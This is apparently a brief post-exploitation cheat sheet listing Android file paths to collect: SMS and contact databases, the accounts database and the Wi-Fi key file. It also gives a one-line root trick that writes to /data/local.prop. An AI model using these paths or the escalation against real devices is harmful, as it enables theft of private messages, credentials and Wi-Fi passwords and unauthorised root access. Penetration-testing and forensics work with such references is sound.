# Android

##Files to grab

###Text Messages (Needs Root):

```
/data/data/com.android.providers.telephony/databases/mmssms.db
/data/data/com.android.providers/telephony/databases/mmssms.db
```

###Contacts (Needs Root):

```
/data/data/com.android.providers.contacts/databases/contacts2.db
/data/data/com.android.providers.contacts/databases/contacts.db
/data/data/android.providers.contacts/databases
```

###Accounts (Needs Root):

```
/data/system/users/0/accounts.db
/data/system/accounts.db
```

###Wifi Keys (Needs Root):

```
/data/misc/wifi/wpa_supplicant.conf
```

###Local System Settings:

```
/data/local.prop
```

If you can write to this file the following line will grant root:

```
echo "ro.kernel.qemu=1" > /data/local.prop
```

###Device Settings:

```
/system/build.prop
```

